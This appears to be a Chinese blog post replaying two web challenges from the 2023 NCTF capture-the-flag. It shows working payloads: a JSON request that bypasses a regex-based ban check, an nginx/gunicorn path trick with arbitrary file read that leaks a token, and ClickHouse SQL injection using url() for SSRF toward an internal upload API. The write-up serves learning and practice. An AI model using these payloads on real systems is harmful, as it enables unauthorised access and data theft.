

<!DOCTYPE html>
<html lang="en">
<head>
  


<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>2023NCTF web复现 daem0nu</title>


    <meta name="author" content="daem0nu">





  <link rel="alternate" href="/atom.xml " title="daem0nu" type="application/atom+xml">


  
    <link rel="stylesheet" href="/css/main.css">
  

<meta name="generator" content="Hexo 7.0.0"></head>
  <body data-theme="light" class="notransition">
    <script>
      const body = document.body;
      const data = body.getAttribute("data-theme");
      const initTheme = (state) => {
        if (state === "dark") {
          body.setAttribute("data-theme", "dark");
        } else if (state === "light") {
          body.removeAttribute("data-theme");
        } else {
          localStorage.setItem("theme", data);
        }
      };
   
      initTheme(localStorage.getItem("theme"));
      
      setTimeout(() => body.classList.remove("notransition"), 75);
    </script>
  <div class="navbar" role="navigation">
    <nav class="menu">
      <input type="checkbox" id="menu-trigger" class="menu-trigger" />
      <label for="menu-trigger">
        <span class="menu-icon">
          <svg
            xmlns="http://www.w3.org/2000/svg"
            width="24"
            height="24"
            viewBox="0 0 512 512"
          >
            <path
              d="M64,384H448V341.33H64Zm0-106.67H448V234.67H64ZM64,128v42.67H448V128Z"
            />
          </svg>
        </span>
      </label>
      <a id="mode">
        <svg
          class="mode-sunny"
          xmlns="http://www.w3.org/2000/svg"
          width="24"
          height="24"
          viewBox="0 0 512 512"
        >
          <title>LIGHT</title>
          <line
            x1="256"
            y1="48"
            x2="256"
            y2="96"
            style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"
          />
          <line
            x1="256"
            y1="416"
            x2="256"
            y2="464"
            style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"
          />
          <line
            x1="403.08"
            y1="108.92"
            x2="369.14"
            y2="142.86"
            style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"
          />
          <line
            x1="142.86"
            y1="369.14"
            x2="108.92"
            y2="403.08"
            style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"
          />
          <line
            x1="464"
            y1="256"
            x2="416"
            y2="256"
            style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"
          />
          <line
            x1="96"
            y1="256"
            x2="48"
            y2="256"
            style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"
          />
          <line
            x1="403.08"
            y1="403.08"
            x2="369.14"
            y2="369.14"
            style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"
          />
          <line
            x1="142.86"
            y1="142.86"
            x2="108.92"
            y2="108.92"
            style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"
          />
          <circle
            cx="256"
            cy="256"
            r="80"
            style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"
          />
        </svg>
        <svg
          class="mode-moon"
          xmlns="http://www.w3.org/2000/svg"
          width="24"
          height="24"
          viewBox="0 0 512 512"
        >
          <title>DARK</title>
          <line
            x1="256"
            y1="48"
            x2="256"
            y2="96"
            style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"
          />
          <line
            x1="256"
            y1="416"
            x2="256"
            y2="464"
            style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"
          />
          <line
            x1="403.08"
            y1="108.92"
            x2="369.14"
            y2="142.86"
            style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"
          />
          <line
            x1="142.86"
            y1="369.14"
            x2="108.92"
            y2="403.08"
            style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"
          />
          <line
            x1="464"
            y1="256"
            x2="416"
            y2="256"
            style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"
          />
          <line
            x1="96"
            y1="256"
            x2="48"
            y2="256"
            style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"
          />
          <line
            x1="403.08"
            y1="403.08"
            x2="369.14"
            y2="369.14"
            style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"
          />
          <line
            x1="142.86"
            y1="142.86"
            x2="108.92"
            y2="108.92"
            style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"
          />
          <circle
            cx="256"
            cy="256"
            r="80"
            style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"
          />
        </svg>
      </a>
      <div class="trigger">
        <div class="trigger-container">
          
            
            
            
            
            
            
            <a class="menu-link " href="/"> Home</a>
          
            
            
            
            
            
            
            <a class="menu-link " href="/about/"> About</a>
          
            
            
            
            
            
            
            <a class="menu-link " href="/archives/"> Archives</a>
          
            
            
            
            
            
            
            <a class="menu-link " href="/categories/"> Categories</a>
          
            
            
            
            
            
            
            <a class="menu-link " href="/tags/"> Tags</a>
          
        </div>
      </div>
    </nav>
  </div>
  
<div class="wrapper post">
  <main class="page-content" aria-label="Content">
      <header class="header">
        
          <div class="tags">
            <a href="/tags/NCtf/" class="tag"># NCtf</a>
          </div>
        
        <h1 class="header-title" itemprop="headline">2023NCTF web复现</h1>
          <div class="post-meta">
            <time>Jan 04, 2024</time>
            <span itemprop="author">
              <span itemprop="name">daem0nu</span>
            </span>
          </div>
        </header>

          <div class="page-content"><h1 id="2023-NCTF-Web复现"><a href="#2023-NCTF-Web复现" class="headerlink" title="2023 NCTF Web复现"></a>2023 NCTF Web复现</h1><h2 id="1-Wait-What"><a href="#1-Wait-What" class="headerlink" title="1.Wait-What"></a>1.Wait-What</h2><p>第一处waf需要我们正则绕过<code>/^hacker$|^admin$/g</code>,<code>let test1 = banned_users_regex.test(username)</code>,其中<code>banned_users_regex</code>的值即<code>/^hacker$|^admin$/g</code>，而username需要为admin才能获取flag，一开始我尝试了<code>admin\u000a</code>,即使能绕过第一处waf，甚至第二处waf，但是下面这部分就无法通过  </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (username <span class="keyword">in</span> users &amp;&amp; users[username] === password) &#123;</span><br><span class="line">    <span class="title function_">next</span>()</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">res.<span class="title function_">send</span>(<span class="string">&quot;用户名或密码错误，鉴权失败！&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>其实我的尝试就相当于</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a=<span class="string">&quot;admin\n&quot;</span>;</span><br><span class="line"><span class="string">&quot;admin&quot;</span> === a</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>
<p>然后查阅<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/RegExp/lastIndex">RegExp文档</a>，发现RegExp在正则出现&#x2F;g时会有lastIndex属性,描述如下</p>
<img src="/2024/01/04/2023NCTF-web%E5%A4%8D%E7%8E%B0/RegExp.jpg" class="">  
<p>本地测试一下就是  </p>
<img src="/2024/01/04/2023NCTF-web%E5%A4%8D%E7%8E%B0/admintest.jpg" class="">
<p>到这里是不是就是说，我们直接用admin登入两次就能绕过这个正则？，其实不是，源码里面有个很关键的操作,我们在第二次请求时，RegExp对象又被重新设置了一遍，也就是lastIndex又回归0了  </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 每次请求前，更新封禁用户正则信息</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="keyword">function</span> (<span class="params">req, res, next</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="title function_">build_banned_users_regex</span>()</span><br><span class="line">		<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;封禁用户正则表达式（满足这个正则表达式的用户名为被封禁用户名）：&quot;</span>,banned_users_regex)</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">next</span>()</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> banned_users_regex = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">build_banned_users_regex</span>(<span class="params"></span>) &#123;</span><br><span class="line">	<span class="keyword">let</span> regex_string = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> username <span class="keyword">of</span> banned_users) &#123;</span><br><span class="line">        regex_string += <span class="string">&quot;^&quot;</span> + escapeRegExp(username) + <span class="string">&quot;$&quot;</span> + <span class="string">&quot;|&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    regex_string = regex_string.<span class="title function_">substring</span>(<span class="number">0</span>, regex_string.<span class="property">length</span> - <span class="number">1</span>)</span><br><span class="line">    banned_users_regex = <span class="keyword">new</span> <span class="title class_">RegExp</span>(regex_string, <span class="string">&quot;g&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么我们能不能让它不执行那个<code>build_banned_users_regex()</code>函数，想阻止它执行就需要产生错误，下面我们看看错误js的错误机制是怎么样的,我们仿造题目的样子，制造了一个有错误和没错误的测试,发现发生错误时1234567无法输出，也就是说当有catch存在时，发生error处之后的代码都不会执行了    </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">b</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;oops&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;1234567&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="title function_">b</span>()</span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;b() has error&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//运行结果：b() has error</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">b</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">//throw new Error(&quot;oops&quot;)</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;1234567&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="title function_">b</span>()</span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;b() has error&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//运行结果：1234567</span></span><br><span class="line"></span><br><span class="line"><span class="string">``</span><span class="string">`  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">而题目当中刚好有这样一处,`</span>escapeRegExp(username)<span class="string">`位于`</span>banned_users_regex = <span class="keyword">new</span> <span class="title class_">RegExp</span>(regex_string, <span class="string">&quot;g&quot;</span>)<span class="string">`之前，如果能在其中制造一个错误，我们就能规避RegExp对象的重置</span></span><br><span class="line"><span class="string">`</span><span class="string">``</span>js</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> username <span class="keyword">of</span> banned_users) &#123;</span><br><span class="line">        regex_string += <span class="string">&quot;^&quot;</span> + escapeRegExp(username) + <span class="string">&quot;$&quot;</span> + <span class="string">&quot;|&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="string">``</span><span class="string">`  </span></span><br><span class="line"><span class="string">观察到`</span>escapeRegExp(string)<span class="string">`的string来源于username，而username来源于banned_users</span></span><br><span class="line"><span class="string">`</span><span class="string">``</span>js</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">escapeRegExp</span>(<span class="params">string</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> string.<span class="title function_">replace</span>(<span class="regexp">/[.*+?^$&#123;&#125;()|[\]\\]/g</span>, <span class="string">&#x27;\\$&amp;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="string">``</span><span class="string">`  </span></span><br><span class="line"><span class="string">看看banned_users是如何产生的,想要制造错误，我们应该让传入的username不能为字符串，而这个接口刚好没有进行过滤，所以如果我们传入一个对象类型&#123;&quot;asd&quot;:1&#125;就能出发上述的错误，达到我们的目的</span></span><br><span class="line"><span class="string">`</span><span class="string">``</span>js</span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/api/ban_user&#x27;</span>, requireLogin, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> username = req.<span class="property">body</span>.<span class="property">username</span></span><br><span class="line">    <span class="keyword">let</span> ban_username = req.<span class="property">body</span>.<span class="property">ban_username</span></span><br><span class="line">    <span class="keyword">if</span>(!ban_username)&#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;ban_username不能为空&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(username === ban_username)&#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;不能封禁自己&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> name <span class="keyword">of</span> banned_users)&#123;</span><br><span class="line">        <span class="keyword">if</span> (name === ban_username) &#123;</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&quot;用户已经被封禁&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    banned_users.<span class="title function_">push</span>(ban_username)</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&quot;封禁成功！&quot;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>接下来是waf二,waf增加了admin的限制，所以<code>banned_users = [&#39;hacker&#39;,&#39;admin&#39;]</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">let banned_users = [&#x27;hacker&#x27;]</span><br><span class="line">let test2 = (username in banned_users)</span><br></pre></td></tr></table></figure>

<p>我们看看<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/in">in</a>操作符是怎么工作的，依据文档我们测试如下，发现确实如文档所说in只能判断键是否存在，而无法判断对应值是否存在，到此似乎我们直接令<code>username=admin</code>即可绕过waf2</p>
<img src="/2024/01/04/2023NCTF-web%E5%A4%8D%E7%8E%B0/in.jpg" class="">
<img src="/2024/01/04/2023NCTF-web%E5%A4%8D%E7%8E%B0/list.jpg" class="">

<p>最终payload如下,然后直接<code>username=admin,password=admin</code>访问flag页面即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /api/ban_user HTTP/1.1</span><br><span class="line">Host: 10.0.0.129:8082</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Referer: http://10.0.0.129:8082/</span><br><span class="line">Origin: http://10.0.0.129:8082</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Length: 58</span><br><span class="line"></span><br><span class="line">&#123;&quot;username&quot;:&quot;guest&quot;,&quot;password&quot;:&quot;guest&quot;,&quot;ban_username&quot;:&#123;&quot;a&quot;:1&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-Click-House"><a href="#2-Click-House" class="headerlink" title="2.Click-House"></a>2.Click-House</h2><p>如果我们直接利用nginx的proxy，我们只能访问backend的<code>/api/ping</code>,<code>/api/token</code>,<code>/api/upload</code>接口，其中<code>/api/token</code>,<code>/api/upload</code>只能以<code>172.28</code>网段访问，在我的本地环境中就是<code>172.30</code>网段才能访问</p>
<p>根据题目的hint，<a target="_blank" rel="noopener" href="http://www.hackdig.com/10/hack-524627.htm">nginx+gunicorn解析漏洞</a>,我们就能访问<code>/</code>和<code>/query</code>接口了，nginx proxy访问backend&#x2F;,发现一个任意文件读取，把token读了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /	HTTP/1.1/../../api/ HTTP/1.1</span><br><span class="line">Host: 10.0.0.129:8013</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 0</span><br><span class="line"></span><br><span class="line">name=/app/.token</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.21.0</span><br><span class="line">Date: Mon, 25 Dec 2023 08:51:33 GMT</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 33</span><br><span class="line"></span><br><span class="line">bcb7e2b83fc3378ccf7c641e92ad8bf4</span><br></pre></td></tr></table></figure>

<p>接下来应该就要想办法从<code>178.30</code>网段访问&#x2F;api&#x2F;upload，先控制这个接口再说，文档中发现了<a target="_blank" rel="noopener" href="https://clickhouse.com/docs/en/sql-reference/table-functions/url">表函数url</a>，根据这个可以构造以下payload，并且得知如果INSERT配合url()将会使用POST方法访问url</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> a <span class="keyword">from</span> url(<span class="string">&#x27;http://172.30.0.3:8001/api/token&#x27;</span>,<span class="string">&#x27;CSV&#x27;</span>,<span class="string">&#x27;a String&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p>但是很遗憾，clickhouse并不支持堆叠注入</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>clickhouse<span class="operator">-</span>client</span><br><span class="line"><span class="number">1370e293700</span>b :) <span class="keyword">select</span> <span class="number">1</span>;<span class="keyword">select</span> <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">Syntax error (Multi<span class="operator">-</span>statements <span class="keyword">are</span> <span class="keyword">not</span> allowed): failed <span class="keyword">at</span> position <span class="number">9</span> (<span class="keyword">end</span> <span class="keyword">of</span> query):</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>;<span class="keyword">select</span> <span class="number">2</span>;</span><br></pre></td></tr></table></figure>

<p>google搜索clickhouse post时发现<a target="_blank" rel="noopener" href="https://clickhouse.com/docs/en/interfaces/http">clickhouse的http接口</a>，从中我们指定clickhouse可以通过8123端口访问其webUI界面，最重要的是它能够使用query参数执行sql语句，那么这就解决了上面无法堆叠注入的问题，我们可以利用url()来ssrf访问<code>http://localhost:8123/?query=select 1</code></p>
<p>下面研究一下这段代码是如何实现上传功能的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">files = web.<span class="built_in">input</span>(myfile=&#123;&#125;)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;myfile&#x27;</span> <span class="keyword">in</span> files:</span><br><span class="line">    filepath = os.path.join(<span class="string">&#x27;upload/&#x27;</span>, files.myfile.filename)</span><br><span class="line">    <span class="keyword">if</span> (os.path.isfile(filepath)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filepath, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(files.myfile.file.read())</span><br></pre></td></tr></table></figure>

<p>在网上发现了<a target="_blank" rel="noopener" href="https://www.cnblogs.com/jolin123/p/4683677.html">基于web.py的文件上传</a>，本地上传测试确定了上传的数据结构为<code>multipart/form-data</code>，抓取的部分数据包如下</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundarytxS8SovqVYBwwSzG</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarytxS8SovqVYBwwSzG</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;myfile&quot;; filename=&quot;ban.txt&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/plain</span><br><span class="line"></span><br><span class="line">this is a test</span><br><span class="line">------WebKitFormBoundarytxS8SovqVYBwwSzG--</span><br></pre></td></tr></table></figure>

<p>但是接下来本地环境出现了一个问题，<code>url()</code>当中的<code>headers()</code>函数clickhouse无法识别，查了<a target="_blank" rel="noopener" href="https://github.com/ClickHouse/ClickHouse/issues/37897">社区讨论</a>后发现，似乎官方有打算加入这个函数，并且官方文档也有，所以大胆猜测应该是题目环境太老了，于是果断用23版本把21版换掉了，果然就不会出现识别不到函数的错误了</p>
<p>尝试构造上传payload,在这之前我们需要深入了解一下<code>url()</code>的第二个参数<a target="_blank" rel="noopener" href="https://clickhouse.com/docs/en/interfaces/formats#formats">format</a>,下面的payload我一开始还是和第一次那样让<code>format</code>为<code>CSV</code>,但是这样上传之后log里面出现了这样的错误</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[2023-12-28 15:18:18 +0000] [8] [CRITICAL] WORKER TIMEOUT (pid:47)</span><br><span class="line">[2023-12-28 15:18:18 +0000] [47] [INFO] Worker exiting (pid: 47)</span><br><span class="line">[2023-12-28 15:18:18 +0000] [8] [ERROR] Worker (pid:47) exited with code 1</span><br><span class="line">[2023-12-28 15:18:18 +0000] [8] [ERROR] Worker (pid:47) exited with code 1.</span><br><span class="line">[2023-12-28 15:18:18 +0000] [52] [INFO] Booting worker with pid: 52</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;/usr/local/lib/python3.11/site-packages/web/application.py&quot;, line 280, in process</span><br><span class="line">    return self.handle()</span><br><span class="line">           ^^^^^^^^^^^^^</span><br><span class="line">  File &quot;/usr/local/lib/python3.11/site-packages/web/application.py&quot;, line 271, in handle</span><br><span class="line">    return self._delegate(fn, self.fvars, args)</span><br><span class="line">           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class="line">  File &quot;/usr/local/lib/python3.11/site-packages/web/application.py&quot;, line 517, in _delegate</span><br><span class="line">    return handle_class(cls)</span><br><span class="line">           ^^^^^^^^^^^^^^^^^</span><br><span class="line">  File &quot;/usr/local/lib/python3.11/site-packages/web/application.py&quot;, line 495, in handle_class</span><br><span class="line">    return tocall(*args)</span><br><span class="line">           ^^^^^^^^^^^^^</span><br><span class="line">  File &quot;/app/run.py&quot;, line 70, in POST</span><br><span class="line">    filepath = os.path.join(&#x27;upload/&#x27;, files.myfile.filename)</span><br><span class="line">                                       ^^^^^^^^^^^^^^^^^^^^^</span><br><span class="line">AttributeError: &#x27;dict&#x27; object has no attribute &#x27;filename&#x27;</span><br></pre></td></tr></table></figure>

<p>这让我想起了我的测试payload，测试的payload也出现了上述的错误，也就是说我精心构造的http包最后解析的结果和测试payload一样，就是个单纯的字符串，而没有形成<code>multipart/form</code>格式</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">FUNCTION</span> url(<span class="string">&#x27;http://172.30.0.3:8001/api/upload&#x27;</span>, <span class="string">&#x27;CSV&#x27;</span>, <span class="string">&#x27;x String&#x27;</span>,headers(<span class="string">&#x27;X-Access-Token&#x27;</span><span class="operator">=</span><span class="string">&#x27;cbed5f0c829320a82e5d5f4713b02425&#x27;</span>)) <span class="keyword">VALUES</span> (<span class="string">&#x27;123456&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>那么我们先去clickhouse-client里面看看是怎么回事，浏览文档后我主要做了以下测试,文档说format是对input和output的格式转换，也就是分别对应了insert和select。经过下面的测试答案已经呼之欲出了，因为我使用的是CSV格式，即使<code>\r\n</code>都正确解析了，但是整个数据却被<code>&quot;</code>包裹起来了，显然这不是合规的http请求包。然后再看看<code>TabSeparated</code>和<code>TabSeparatedRaw</code>应该选择哪个，很明显是<code>TabSeparatedRaw</code>，它既完成换行，也没有被引号包裹</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3</span>beb84db6e9c :) <span class="keyword">select</span> <span class="string">&#x27;hello\nwrold&#x27;</span> FORMAT CSV</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;hello\nwrold&#x27;</span></span><br><span class="line">FORMAT CSV</span><br><span class="line"></span><br><span class="line">Query id: cae15584<span class="number">-008e-4810</span><span class="number">-9416</span><span class="operator">-</span>e010b394a3e4</span><br><span class="line"></span><br><span class="line">&quot;hello</span><br><span class="line">wrold&quot;</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> set. Elapsed: <span class="number">0.001</span> sec.</span><br></pre></td></tr></table></figure>

